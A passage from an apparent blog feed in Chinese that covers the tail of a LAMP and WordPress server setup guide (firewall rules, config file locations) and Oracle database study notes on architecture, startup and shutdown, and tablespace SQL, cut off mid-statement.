--permanent<br>firewall-cmd --add-port=22/tcp --permanent<br>firewall-cmd --add-port=23/tcp --permanent</p></blockquote><p>重载防火墙规则：</p><blockquote><p>firewall-cmd --reload</p></blockquote><p>查看当前的防火墙规则：</p><blockquote><p>iptables -L -n</p></blockquote><p>设置防火墙为开机启动：</p><blockquote><p>systemctl enable firewalld</p></blockquote><p><font color="red">至此LAMP + WordPress的基本环境全部部署完成</font>。</p><h2 id="4-后话：几个重要的配置文件"><a href="#4-后话：几个重要的配置文件" class="headerlink" title="4. 后话：几个重要的配置文件"></a>4. 后话：几个重要的配置文件</h2><p>① Apache-httpd服务的配置文件，主要用于配置Apache的rewrite模块功能：</p><blockquote><p>/etc/httpd/conf/httpd.conf</p></blockquote><p>② PHP的配置文件（若在win环境用于打开关闭php的扩展模块； 若在linux环境没什么用，要用哪些模块需要直接安装即可）：</p><blockquote><p>/etc/php.ini</p></blockquote><p>③ phpMyAdmin配置文件，其利用PHP在网页连接数据库，若数据库配置变更需要修改此配置文件：</p><blockquote><p>/etc/phpMyAdmin/config.inc.php</p></blockquote><p>④ Wordpress配置文件，若数据库配置变更需要修改此配置文件，另外wordpress的某些自定义配置也需要用到此配置文件：</p><blockquote><p>/var/www/html/wp-config.php</p></blockquote><p>⑤ Mariadb配置文件，后续需要优化数据库时要修改这些配置文件：</p><blockquote><p>/etc/my.cnf　# 此配置文件引用了 /etc/my.cnf.d 目录下的配置，不建议改动，避免Mariadb升级时覆盖掉<br>/etc/my.cnf.d/server.cnf　　# 一般情况下修改这个配置文件即可<br>/etc/my.cnf.d/client.cnf<br>/etc/my.cnf.d/mysql-clients.cnf</p></blockquote><h2 id="5-资源下载"><a href="#5-资源下载" class="headerlink" title="5. 资源下载"></a>5. 资源下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10484861">本文全文下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> LAMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle学习笔记</title>
      <link href="/articles/db/oracle-xue-xi-bi-ji/"/>
      <url>/articles/db/oracle-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>本学习笔记仅涵盖了基本的 Oracle 入门知识，是我在学习时的随笔记录整理，其中部分内容可能存在错漏。若有疑问敬请提出或指正。</p><h2 id="2-参考资料"><a href="#2-参考资料" class="headerlink" title="2. 参考资料"></a>2. 参考资料</h2><table><thead><tr><th align="center">名称</th><th align="center">来源</th></tr></thead><tbody><tr><td align="center">Oracle新建用户、角色，授权，建表空间</td><td align="center"><a href="https://www.2cto.com/database/201109/103010.html">红黑联盟</a></td></tr><tr><td align="center">Oracle表空间的相关查询</td><td align="center"><a href="https://wenku.baidu.com/view/611ed6cada38376baf1fae81.html">百度文库</a></td></tr><tr><td align="center">查找Oracle数据文件、表空间的位置</td><td align="center"><a href="http://blog.163.com/login.do?err=403">网易博客</a></td></tr><tr><td align="center">Oracle创建表空间、给用户分配表空间</td><td align="center"><a href="https://blog.csdn.net/btt2013/article/details/78007011">CSDN</a></td></tr><tr><td align="center">Oracle新建数据库</td><td align="center"><a href="https://zhidao.baidu.com/question/143948884.html">百度知道</a></td></tr><tr><td align="center">Oracle数据库导入导出命令</td><td align="center"><a href="http://www.cnblogs.com/fjfzhkb/archive/2007/09/03/879807.html">博客园</a></td></tr><tr><td align="center">expdp 详解及实例</td><td align="center"><a href="https://wenku.baidu.com/view/83324be86294dd88d0d26be0.html">百度文库</a></td></tr><tr><td align="center">expdp/impdp 及 exp/imp</td><td align="center"><a href="http://www.cnblogs.com/lanzi/archive/2011/01/06/1927731.html">博客园</a></td></tr><tr><td align="center">Oracle数据库impdb和expdb操作</td><td align="center"><a href="http://blog.sina.com.cn/s/blog_6d6d186901010z3b.html">新浪博客</a></td></tr></tbody></table><h2 id="3-数据库体系结构"><a href="#3-数据库体系结构" class="headerlink" title="3. 数据库体系结构"></a>3. 数据库体系结构</h2><h3 id="3-1-逻辑与物理结构"><a href="#3-1-逻辑与物理结构" class="headerlink" title="3.1. 逻辑与物理结构"></a>3.1. 逻辑与物理结构</h3><p><img src="./01.png"></p><h4 id="3-1-1-数据库-Database"><a href="#3-1-1-数据库-Database" class="headerlink" title="3.1.1. 数据库 Database"></a>3.1.1. 数据库 Database</h4><p>数据库是磁盘上存储的数据的集合（包括数据文件、日志文件、配置文件和控制文件），但Oracle同时也是一种关系型数据库管理系统（RDBMS），它能够提供关系模式存储和访问数据的方法，因此“数据库”不纯粹指物理上的数据，也指在逻辑上的各种对象的组合。</p><h4 id="3-1-2-表空间-TableSpace"><a href="#3-1-2-表空间-TableSpace" class="headerlink" title="3.1.2. 表空间 TableSpace"></a>3.1.2. 表空间 TableSpace</h4><p>表空间是数据库的逻辑划分，它是数据库中物理编组的数据仓库。</p><p>一个数据库是由一个或多个表空间所组成的，每个数据库至少有一个表空间（叫系统表空间），而其他表空间则可供用户群及应用系统共同使用。</p><p>一个表空间只能属于一个数据库。</p><h4 id="3-1-3-段-Segment"><a href="#3-1-3-段-Segment" class="headerlink" title="3.1.3 段 Segment"></a>3.1.3 段 Segment</h4><p>段是表空间的逻辑划分，一个表空间包含许多段。</p><p>段包括一个表空间内特定逻辑结构的所有数据，段不能跨表空间存放。</p><h4 id="3-1-4-区-Extent"><a href="#3-1-4-区-Extent" class="headerlink" title="3.1.4. 区 Extent"></a>3.1.4. 区 Extent</h4><p>区是段的逻辑划分，一个段是一个或多个不连续的区的集合。</p><p>一个区由一组连续的数据库块组成。</p><h4 id="3-1-5-数据库块-DatabaseBlock"><a href="#3-1-5-数据库块-DatabaseBlock" class="headerlink" title="3.1.5. 数据库块 DatabaseBlock"></a>3.1.5. 数据库块 DatabaseBlock</h4><p>数据库块也称逻辑块或Oracle块，它是Oracle最小的存储单位。Oracle每次请求数据的时候，都是以块为单位。也就是说，Oracle每次请求的数据是块的整数倍。如果Oracle请求的数据量不到一块，Oracle也会读取整个块。</p><p>数据库块对应磁盘上一个或多个物理块（不必连续）。</p><h3 id="3-2-模式对象"><a href="#3-2-模式对象" class="headerlink" title="3.2. 模式对象"></a>3.2. 模式对象</h3><h4 id="3-2-1-实例-Instance"><a href="#3-2-1-实例-Instance" class="headerlink" title="3.2.1. 实例 Instance"></a>3.2.1. 实例 Instance</h4><p>数据库实例是运行在数据库文件上的一组Oracle后台进程/线程以及一个共享的内存区。即用于访问一个数据库文件集的一个存储结构及后台进程的集合。</p><p>数据库可以由数据库实例装载和打开。一般一个数据库对应一个数据库实例，但多个不同的Oracle实例可以装在同一个Oracle数据库。</p><h4 id="3-2-2-数据库链-DatabaseLink"><a href="#3-2-2-数据库链-DatabaseLink" class="headerlink" title="3.2.2. 数据库链 DatabaseLink"></a>3.2.2. 数据库链 DatabaseLink</h4><p>数据库链是与远程数据库连接的存储定义，它们用于查询分布数据库环境的远程者。由于存储在DBA_DB_LINKS数据字典中，所以可以把它们看作一种数据库对象类型。</p><h4 id="3-2-3-表-Table"><a href="#3-2-3-表-Table" class="headerlink" title="3.2.3. 表 Table"></a>3.2.3. 表 Table</h4><p>表是数据库中用来存储数据的对象，是有结构的数据的集合。</p><p>数据在表中式按行和列的格式组织排列，表中的每一列为称为“字段”（又称“属性”），每一行称为“元组”（又称“记录”）。表上有约束规则，用于确保数据的有效性。</p><h4 id="3-2-4-视图-View"><a href="#3-2-4-视图-View" class="headerlink" title="3.2.4. 视图 View"></a>3.2.4. 视图 View</h4><p>视图是存储在数据库中的查询的SQL语句，它是一张虚拟表。</p><p>使用它主要出于两种主要原因：安全原因，视图可以隐藏一些数据；另一原因是可使复杂的查询易于理解和使用。<br>其中物化视图是视图的一种特例，它类似于索引。</p><p>物化视图是用于预先计算并保存表连接或聚集等耗时较多的操作的结果，这样在执行查询时，就可以避免进行这些耗时的操作，从而快速的得到结果，提高查询性能。</p><p>增加和删除物化视图不会影响应用程序中SQL 语句的正确性和有效性。但物化视图需要占用存储空间；当基表发生变化时，物化视图也应当刷新。</p><h4 id="3-2-5-同义词-Synonym"><a href="#3-2-5-同义词-Synonym" class="headerlink" title="3.2.5. 同义词 Synonym"></a>3.2.5. 同义词 Synonym</h4><p>同义词是指向其它数据库表的数据库指针。同义词有两种类型：私有（private）和公共（public）。</p><p>私有的同义词是在指定的模式中创建并且只创建者使用的模式访问。</p><p>公共同义词是由public 指定的模式访问，所有数据库模式（用户）都可以访问它。</p><h4 id="3-2-6-索引-Index"><a href="#3-2-6-索引-Index" class="headerlink" title="3.2.6. 索引 Index"></a>3.2.6. 索引 Index</h4><p>当从表中访问数据时，Oracle提供了两个选择：从表中读取每一行（即全表扫描）；或者通过ROWID一次读取一行。</p><p>索引不能滥用，当访问大型表的少量行时，使用索引可能效率更高。性能统计结果，当索引搜索的行数不多于总行数的4%时，性能比全表扫描快。</p><h4 id="3-2-7-序列-Sequence"><a href="#3-2-7-序列-Sequence" class="headerlink" title="3.2.7. 序列 Sequence"></a>3.2.7. 序列 Sequence</h4><p>序列是用于产生唯一数码的数据库对象，序列创建时带有初始值、增量值、最大值等，最大可达38位整数。</p><p>在Oracle由于没有类似于MySQL的auto_increment或SyBase的IDENTITY，因此主键自增基本都依赖于使用序列实现。</p><h4 id="3-2-8-存储过程-StoredProcedure"><a href="#3-2-8-存储过程-StoredProcedure" class="headerlink" title="3.2.8. 存储过程 StoredProcedure"></a>3.2.8. 存储过程 StoredProcedure</h4><p>一组为了完成特定功能的SQL语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。</p><h4 id="3-2-9-触发器-Trigger"><a href="#3-2-9-触发器-Trigger" class="headerlink" title="3.2.9. 触发器 Trigger"></a>3.2.9. 触发器 Trigger</h4><p>触发器（trigger）是个特殊的存储过程，它的执行不是由程序调用，也不是手工启动，而是由个事件来触发，比如当对一个表进行操作（insert，delete， update）时就会激活它执行。触发器经常用于加强数据的完整性约束和业务规则等。</p><h4 id="3-2-10-函数-Function"><a href="#3-2-10-函数-Function" class="headerlink" title="3.2.10. 函数 Function"></a>3.2.10. 函数 Function</h4><p>可以看作是一个简单的存储过程，但是使用限制比存储过程多，但是可以（且仅可以）返回单行值，可以在select语句中嵌套使用。</p><h4 id="3-2-11-数据字典"><a href="#3-2-11-数据字典" class="headerlink" title="3.2.11. 数据字典"></a>3.2.11. 数据字典</h4><p>数据字典是Oracle存放有关数据库信息的地方，它是一组表和视图结构。存放在SYSTEM表空间中，其用途是用于描述数据。</p><p>Oracle的系统进程会通过数据字典对数据库进行操作，用户也可以用SQL语句访问数据字典，数据字典内容包括：</p><ul><li>数据库中所有模式对象的信息，如表、视图、簇、及索引等。</li><li>分配多少空间，当前使用了多少空间等。</li><li>列的缺省值。</li><li>约束信息的完整性。</li><li>Oracle用户的名字。</li><li>用户及角色被授予的权限。</li><li>用户访问或使用的审计信息。</li><li>其它产生的数据库信息。</li></ul><h3 id="3-3-Oracle进程与内存结构"><a href="#3-3-Oracle进程与内存结构" class="headerlink" title="3.3. Oracle进程与内存结构"></a>3.3. Oracle进程与内存结构</h3><p><img src="./02.png"></p><p>当在计算机服务器上启动Oracle数据库后，称服务器上启动了一个Oracle实例（Instance）。</p><p>Oracle实例（Instance）是存取和控制数据库的软件机制，它包括Oracle进程和系统全局区（System Global Area，SGA）两部分。</p><h4 id="3-3-1-Oracle进程"><a href="#3-3-1-Oracle进程" class="headerlink" title="3.3.1. Oracle进程"></a>3.3.1. Oracle进程</h4><p>Oracle进程由用户进程、服务器进程和后台进程所组成。</p><p>当用户运行一个应用程序时，系统就为它建立一个用户进程。服务器进程与用户进程连接并通讯，为相连的用户进程处理Oracle请求服务。</p><p>为了提高系统性能，更好地实现多用户功能，ORACLE还在系统后台启动一些后台进程，用于数据库数据操作。</p><p>后台进程主要包括：</p><ul><li>SMON 系统监控进程：（system monitor）负责完成自动实例恢复和回收分类（sort）表空间。 </li><li>PMON 进程监控进程：（PRocess monitor）实现用户进程故障恢复、清理内存区和释放该进程所需资源等。 </li><li>DBWR 数据库写进程：数据库缓冲区的治理进程。在它的治理下，数据库缓冲区中总保持有一定数量的自由缓冲块，以确保用户进程总能找到供其使用的自由缓冲块。 </li><li>LGWR 日志文件写进程：是日志缓冲区的治理进程，负责把日志缓冲区中的日志项写入磁盘中的日志文件上。每个实例只有一个LGWR进程。</li><li>CKPT 检查点进程：用于触发检查点事件，把数据缓冲区的数据写入磁盘，并更新控制文件的检查点位置。</li></ul><h4 id="3-3-2-内存结构"><a href="#3-3-2-内存结构" class="headerlink" title="3.3.2. 内存结构"></a>3.3.2. 内存结构</h4><p>SGA是系统为实例分配的一组共享内存缓冲区，用于存放数据库实例和控制信息，以实现对数据库中数据的治理和操作。</p><p>SGA在实例启动时被自动分配，当实例关闭时被收回。数据库的所有数据操作都要通过SGA来进行。</p><p>内存结构的主要组成有：</p><ul><li>数据缓冲区 Database Buffer Cache：存放数据库中数据库块的拷贝。它是由一组缓冲块所组成，这些缓冲块为所有与该实例相链接的用户进程所共享。</li><li>日志缓冲区Redo Log Buffer：存放数据操作的更改信息。它们以日志项的形式存放在日志缓冲区中。当需要进行数据库恢复时，日志项用于重构或回滚对数据库所做的变更。</li><li>共享池Shared Pool：包含用来处理的SQL语句信息。它包含共享SQL区和数据字典存储区。共享SQL区包含执行特定的SQL语句所用的信息。数据字典区用于存放数据字典，它为所有用户进程所共享。</li></ul><h3 id="3-4-Oracle的读写机制"><a href="#3-4-Oracle的读写机制" class="headerlink" title="3.4. Oracle的读写机制"></a>3.4. Oracle的读写机制</h3><h4 id="3-4-1-写操作与检查点"><a href="#3-4-1-写操作与检查点" class="headerlink" title="3.4.1. 写操作与检查点"></a>3.4.1. 写操作与检查点</h4><p>在数据库系统中，写日志和写数据文件是数据库中IO消耗最大的两种操作，在这两种操作中写数据文件属于分散写，写日志文件是顺序写。</p><p>因此为了保证数据库的性能，通常数据库都是保证在提交（commit）完成之前，要先保证日志都被写入到日志文件中。而脏数据块则暂存在数据缓存（Database Buffer Cache）中，再不定期的分批写入到数据文件中。也就是说日志写入和提交操作是同步的，而数据写入和提交操作是不同步的。</p><p>这样就存在一个问题，当一个数据库崩溃的时候并不能保证缓存里面的脏数据全部写入到数据文件中，这样在实例启动的时候就要使用日志文件进行恢复操作，将数据库恢复到崩溃之前的状态，保证数据的一致性。</p><p>检查点（CheckPoint）是这个过程中的重要机制，Oracle通过它来确定在恢复数据时，应该扫描哪些重做日志应，并将其应用于恢复。</p><p>一般所说的CheckPoint是一个数据库事件，CheckPoint事件由LGWR或CKPT进程发出。当CheckPoint事件发生时，DBWn（n表示可能有多个写进程，即并行写）会将脏块写入到磁盘中，同时数据文件和控制文件的文件头也会被更新，以记录最新的CheckPoint信息。</p><h4 id="3-4-2-读操作"><a href="#3-4-2-读操作" class="headerlink" title="3.4.2. 读操作"></a>3.4.2. 读操作</h4><p>相对于写操作，读操作相对简单。</p><p>当用户查询数据时，Oracle数据库首先从数据缓冲区查找。若所要查询的数据不在数据缓冲区中，则Oracle数据库会启动相应的后台进程从数据文件中读取数据，并保存到数据缓冲区中。</p><h3 id="3-5-物理构成"><a href="#3-5-物理构成" class="headerlink" title="3.5. 物理构成"></a>3.5. 物理构成</h3><p>每一个Oracle数据库是主要由三种类型的文件组成：数据文件（.DBF）、日志文件（.LOG）和控制文件（.CTL），另外还包括一些配置文件（参数文件）。</p><h4 id="3-5-1-数据文件"><a href="#3-5-1-数据文件" class="headerlink" title="3.5.1. 数据文件"></a>3.5.1. 数据文件</h4><p>数据文件（Data File）用于存储数据库数据的文件，如表中的记录，索引，数据字典等。</p><p>由于Oracle数据库的表空间与数据文件是一对多的关系，因此当向某个表添加数据时，插入到表中的数据可能仅在一个数据文件中，也可能跨越在多个数据文件中。</p><p>数据文件的读写方式前面已提过，此处不再详述。</p><h4 id="3-5-2-日志文件"><a href="#3-5-2-日志文件" class="headerlink" title="3.5.2. 日志文件"></a>3.5.2. 日志文件</h4><p>在Oracle中，日志文件也叫做重做日志文件或重演日志文件（Redo Log Files）。日志文件用于记录对数据库的修改信息，这包括用户对数据的修改和管理员对数据结构结构的修改。但如果只是对数据库中的信息进行查询操作，则不会产生日志信息。</p><p>在Oracle中，当用户对数据库的数据执行了修改操作，则修改信息首先被记录在日志缓冲区中。在用户commit（或日志缓冲区满1/3时、或超时3秒（可设置））后，由LGWR进程将日志信息从日志缓冲区中读出并写到日志文件中。这时，数据文件中保存的数据可能是修改前的数据，也可能是修改后的数据，但在日志文件中则记录了修改前和修改后两组数据。因此日志文件是保证数据库系统安全、进行备份与恢复的重要手段。日志文件的损坏造成的后果比损坏数据文件更严重，它可能会导致整个数据库系统不能正常使用。</p><h4 id="3-5-3-日志文件组"><a href="#3-5-3-日志文件组" class="headerlink" title="3.5.3. 日志文件组"></a>3.5.3. 日志文件组</h4><p>在Oracle数据库中，日志文件是成组使用的。日志文件的组织单位叫日志文件组，日志文件组中的日志文件叫日志成员。每一个Oracle数据库系统都有多个日志文件组，每一组可以由一个或多个日志成员（即日志文件）组成，但同一组的日志成员所存储的信息完全相同，它们是镜像关系。</p><p>为了防止日志文件被物理损坏，一般建议在每个日志文件组中设置多个日志成员进行镜像，并且镜像文件应该被存储在不同的物理磁盘中。</p><p>在日志工作过程中，多个日志文件组之间是循环使用的。当一日志文件组被填满后，将会发生日起切换，系统自动转换到另一个日志文件组。如果所有的日志文件组都被填满后，则系统将日志信息写入到第一个日志文件组中，这时第一个日志文件组中的日志信息可能被覆盖掉（取决于数据库的工作模式）。</p><p>在Oracle数据库中，数据库有两种运行模式：归档模式（ARCHIVELOG），和非归档模式（NOARCHIVELOG）。</p><p>数据库运行在非归档模式时，如果发生日志切换且需要覆盖，则日志信息直接被覆盖。而当运行在归档模式时，如果发生日志切换且需要覆盖，则系统将启用ARCH进程将要被覆盖的日志信息保存到磁盘或磁带上形成归档日志（即历史日志文件）。在默认情况下，Oracle不采用归档模式。</p><h4 id="3-5-4-控制文件"><a href="#3-5-4-控制文件" class="headerlink" title="3.5.4. 控制文件"></a>3.5.4. 控制文件</h4><p>Oracle的控制文件是一个很小的二进制文件，它用于描述数据库的物理结构。控制文件一般在安装Oracle系统时自动创建。</p><p>由于控制文件存放有数据文件和日志文件等信息，因此Oracle数据库在启动时，数据库须访问控制文件。在数据库的使用过程中，Oracle将不断更新控制文件。如果由于某些原因导致控件文件被损坏，那么数据库也就不能正常工作了。</p><p>由于控制文件的重要性，因此一个数据库至少应该包含一个以上的控制文件，Oracle 10g默认包含了3个控制文件，每个控制文件都包含了相同的信息。这样可确保在数据库运行时，如果某个控制文件损坏，Oracle会自动使用另一个控制文件，不致于因某个控制文件损坏而无法启动数据库。</p><h4 id="3-5-5-配置文件"><a href="#3-5-5-配置文件" class="headerlink" title="3.5.5. 配置文件"></a>3.5.5. 配置文件</h4><p>构成Oracle数据库物理结构的还具有另外一种重要的文件：配置文件（也即参数文件）。配置文件记录了Oracle数据库的基本参数信息，主要包括数据库名、控制文件所在路径、进程等。</p><p>配置文件在安装Oracle数据库系统时由系统自动创建，如果想要对数据库的某些参数进行设置，则尽可能过OEM或ALTER SYSTEM命令来修改，一般避免直接使用编辑器修改配置文件。</p><h2 id="4-Oracle的安装与管理工具"><a href="#4-Oracle的安装与管理工具" class="headerlink" title="4. Oracle的安装与管理工具"></a>4. Oracle的安装与管理工具</h2><h3 id="4-1-Oracle的安装"><a href="#4-1-Oracle的安装" class="headerlink" title="4.1. Oracle的安装"></a>4.1. Oracle的安装</h3><p>略。请自行百度或Google查找Oracle在Linux下的安装方法。</p><p>以下主要以Linux下的Oracle 10g作为背景。</p><h3 id="4-2-Oracle的启动"><a href="#4-2-Oracle的启动" class="headerlink" title="4.2. Oracle的启动"></a>4.2. Oracle的启动</h3><table><thead><tr><th align="center">阶段</th><th align="center">阶段名称</th><th align="left">描述</th><th align="left">命令</th></tr></thead><tbody><tr><td align="center">第一阶段</td><td align="center">nomount</td><td align="left">读取参数文件，分配实例</td><td align="left">startup nomount</td></tr><tr><td align="center">第二阶段</td><td align="center">mount</td><td align="left">加载控制文件的信息到内存</td><td align="left">startup mount 或<br>alter database mount</td></tr><tr><td align="center">第三阶段</td><td align="center">open</td><td align="left">加载所有需要的数据文件和联机日志文件</td><td align="left">Startup 或<br>alter atabase open</td></tr></tbody></table><p>在启动Oracle时若启动失败，则可参照上表核查是在第几阶段失败，则对应再去检查对应文件的完整性即可发现启动失败的原因。</p><h3 id="4-3-Oracle的关闭"><a href="#4-3-Oracle的关闭" class="headerlink" title="4.3. Oracle的关闭"></a>4.3. Oracle的关闭</h3><table><thead><tr><th align="center">关闭方式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">shutdown normal</td><td align="left">不允许建立新的连接（普通用户）<br>等待查询结束<br>等待事务结束<br>产生检查点（完全检查点）<br>关闭数据文件<br>卸载控制文件</td></tr><tr><td align="center">shutdown transactional</td><td align="left">不允许建立新的连接（普通用户）<br>不等待查询结束（查询的会话被杀掉）<br>等待事务结束<br>产生检查点（完全检查点）<br>关闭数据文件，卸载控制文件<br>关闭实例</td></tr><tr><td align="center">shutdown immediate</td><td align="left">不允许建立新的连接（普通用户）<br>不等待查询结束（查询的会话被杀掉）<br>不等待事务结束（将事务rollback）<br>产生检查点（完全检查点）<br>关闭数据文件<br>卸载控制文件</td></tr><tr><td align="center">shutdown abort</td><td align="left">相当于拔电源的关闭方式，易造成脏库<br>重新启动数据库时需要实例的恢复</td></tr></tbody></table><h3 id="4-4-Oracle的管理工具"><a href="#4-4-Oracle的管理工具" class="headerlink" title="4.4. Oracle的管理工具"></a>4.4. Oracle的管理工具</h3><table><thead><tr><th align="center">关闭名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">datastudio</td><td align="left">通用数据库客户端工具</td></tr><tr><td align="center">PL/SQL</td><td align="left">Oracle专用客户端工具</td></tr><tr><td align="center">SQL loader</td><td align="left">Oracle的数据加载工具，常用于Linux下的大数据迁移</td></tr></tbody></table><h2 id="5-Oracle的实例管理"><a href="#5-Oracle的实例管理" class="headerlink" title="5. Oracle的实例管理"></a>5. Oracle的实例管理</h2><h3 id="5-2-创建数据库"><a href="#5-2-创建数据库" class="headerlink" title="5.2. 创建数据库"></a>5.2. 创建数据库</h3><p>对建库SQL不作要求，但从Oracle的建库SQL可以了解数据库的构成：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> mynewdb                        <span class="token comment" spellcheck="true">/* 创建数据库mynewdb */</span>   <span class="token keyword">USER</span> SYS IDENTIFIED <span class="token keyword">BY</span> pz6r58            <span class="token comment" spellcheck="true">/* 数据库用户SYS的密码为pz6r58 */</span>   <span class="token keyword">USER</span> SYSTEM IDENTIFIED <span class="token keyword">BY</span> y1tz5p            <span class="token comment" spellcheck="true">/* 数据库用户SYSTEM的密码为y1tz5p */</span>   LOGFILE                 <span class="token comment" spellcheck="true">/* 创建日志文件组GROUP1、GROUP2、GROUP3 */</span>      <span class="token keyword">GROUP</span> <span class="token number">1</span> <span class="token punctuation">(</span><span class="token string">'/u01/oracle/oradata/mynewdb/redo01.log'</span><span class="token punctuation">)</span> SIZE 100M<span class="token punctuation">,</span>      <span class="token keyword">GROUP</span> <span class="token number">2</span> <span class="token punctuation">(</span><span class="token string">'/u01/oracle/oradata/mynewdb/redo02.log'</span><span class="token punctuation">)</span> SIZE 100M<span class="token punctuation">,</span>      <span class="token keyword">GROUP</span> <span class="token number">3</span> <span class="token punctuation">(</span><span class="token string">'/u01/oracle/oradata/mynewdb/redo03.log'</span><span class="token punctuation">)</span> SIZE 100M   MAXLOGFILES <span class="token number">5</span>                <span class="token comment" spellcheck="true">/* 最多的日志文件组数量为5 */</span>   MAXLOGMEMBERS <span class="token number">5</span>                <span class="token comment" spellcheck="true">/* 每个日志文件组的最大成员数为5 */</span>   MAXLOGHISTORY <span class="token number">1</span>                <span class="token comment" spellcheck="true">/* 最多的历史日志个数为1 */</span>   MAXDATAFILES <span class="token number">100</span>                <span class="token comment" spellcheck="true">/* 最多可以打开的数据文件个数为100 */</span>   MAXINSTANCES <span class="token number">1</span>                <span class="token comment" spellcheck="true">/* 最多只允许有1个实例能够 mount 和 open 数据库 */</span>   <span class="token keyword">CHARACTER SET</span> US7ASCII        <span class="token comment" spellcheck="true">/* 数据库字符集为US7ASCII（对普通的字段属性有效，如CHAR、VARCHAR等） */</span>   <span class="token keyword">NATIONAL CHARACTER</span> <span class="token keyword">SET</span> AL16UTF16        <span class="token comment" spellcheck="true">/* 国家字符集为AL16UTF16（仅对带“N”前缀的字段属性有效，如NCHAR、NVARCHAR等） */</span>   <span class="token comment" spellcheck="true">/* 配置系统表空间的物理位置，若已存在则覆盖，并使用本地化管理方式 */</span>   DATAFILE <span class="token string">'/u01/oracle/oradata/mynewdb/system01.dbf'</span> SIZE 325M REUSE EXTENT MANAGEMENT <span class="token keyword">LOCAL</span>   <span class="token comment" spellcheck="true">/* 配置系统表的辅助表空间的物理位置，若已存在则覆盖 */</span>   SYSAUX DATAFILE <span class="token string">'/u01/oracle/oradata/mynewdb/sysaux01.dbf'</span> SIZE 325M REUSE   <span class="token comment" spellcheck="true">/* 配置系统表的辅助表空间的物理位置，若已存在则覆盖 */</span>   <span class="token keyword">DEFAULT</span> <span class="token keyword">TEMPORARY</span> <span class="token keyword">TABLESPACE</span> tempts1     TEMPFILE <span class="token string">'/u01/oracle/oradata/mynewdb/temp01.dbf'</span> SIZE 20M REUSE   <span class="token comment" spellcheck="true">/* 配置默认临时表空间的物理位置，若已存在则覆盖 */</span>   UNDO <span class="token keyword">TABLESPACE</span> undotbs DATAFILE     <span class="token string">'/u01/oracle/oradata/mynewdb/undotbs01.dbf'</span> SIZE 200M REUSE      <span class="token comment" spellcheck="true">/* 配置撤销表空间的物理位置，若已存在则覆盖，当空间不足时自动扩展，且不限制表空间的物理大小 */</span>      AUTOEXTEND <span class="token keyword">ON</span> MAXSIZE UNLIMITED<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-3-表空间的创建与管理"><a href="#5-3-表空间的创建与管理" class="headerlink" title="5.3. 表空间的创建与管理"></a>5.3. 表空间的创建与管理</h3><h4 id="5-3-1-创建表空间"><a href="#5-3-1-创建表空间" class="headerlink" title="5.3.1. 创建表空间"></a>5.3.1. 创建表空间</h4><p>（1）创建表空间example，其下有2个数据文件，大小分别为100M（若创建的是临时表空间，则要把第1行修改为CREATE TEMPORARY TABLESPACE example TEMPFILE）；</p><p>（2）对于第2个数据文件，当空间不足时可以自动扩展，扩展上限为4G，同时使用本地化管理方式（另一种是字典管理方式extent management dictionary），指定区尺寸为1M（默认为64k），启动段空间自动管理。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLESPACE</span> example DATAFILE <span class="token string">'/oradata/orclnew/example_01.dbf'</span> SIZE 100M<span class="token punctuation">,</span> <span class="token string">'/oradata/orclnew/example_02.dbf'</span> SIZE 100M autoextend <span class="token keyword">on</span> maxsize 4g extent management <span class="token keyword">local</span> uniform size 1m segment space management auto<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="5-3-2-管理表空间"><a href="#5-3-2-管理表空间" class="headerlink" title="5.3.2. 管理表空间"></a>5.3.2. 管理表空间</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 删除表空间 */</span><span class="token keyword">DROP</span> <span class="token keyword">TABLESPACE</span> example INCLUDING CONTENTS<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 扩展表空间 */</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLESPACE</span> example  <span class="token keyword">ADD</span> DATAFILE <span class="token string">'/DISK6/example_04.dbf'</span> SIZE 200M AUTOEXTEND <span class="token keyword">ON</span> <span class="token keyword">NEXT</span> 10M MAXSIZE 500M<span class="token punctuation">;</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> DATAFILE <span class="token string">'/DISK5/example_02.dbf'</span> RESIZE 200M<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 重命名表空间 */</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLESPACE</span> example <span class="token keyword">RENAME</span> DATAFILE <span class="token string">'/DISK4/example_01.dbf'</span> <span class="token keyword">TO</span> <span class="token string">'/DISK5/example_01.dbf'</span><span class="token punctuation">;</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> <span class="token keyword">RENAME</span> <span class="token keyword">FILE</span> <span class="token string">'/DISK1/system_01.dbf'</span> 